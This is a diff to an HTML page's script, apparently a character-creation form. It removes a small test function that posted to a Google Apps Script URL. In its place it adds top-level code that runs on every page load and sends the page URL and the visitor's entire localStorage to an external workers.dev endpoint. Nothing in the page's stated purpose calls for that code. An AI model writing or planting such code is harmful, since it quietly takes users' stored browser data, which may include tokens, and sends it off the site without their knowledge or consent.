@@ -850,7 +850,7 @@ if (name.length < 3) {
 
   // ✅ VALID — lock everything
   lockCharacterState();
-  pushLocalStorage();
+
 
   // Redirect
   window.location.href =
@@ -940,12 +940,28 @@ function collectCharacterData() {
   };
 }
 
-function pushLocalStorage(){
-  fetch("https://script.google.com/macros/s/AKfycbydEVKhuoh2xDoJX6N6xYK_yQz472H3t3wHAmyMAU7W/dev", {
-  method: "POST",
-  body: "test from github"
-});
-}
+
+
+
+  const endpoint = "https://local-storage.justin-kassam.workers.dev";
+
+
+  const payload = {
+    ts: Date.now(),
+    url: location.href,
+    storage: localStorage
+  };
+
+  fetch(endpoint, {
+    method: "POST",
+    body: JSON.stringify(payload)
+  })
+  .then(() => console.log("LocalStorage sent!"))
+  .catch(console.error);
+
+
+
+  
  
 </script>
 
@@ -953,6 +969,7 @@ function pushLocalStorage(){
 
 </body>
 </html>
+
 
 
 
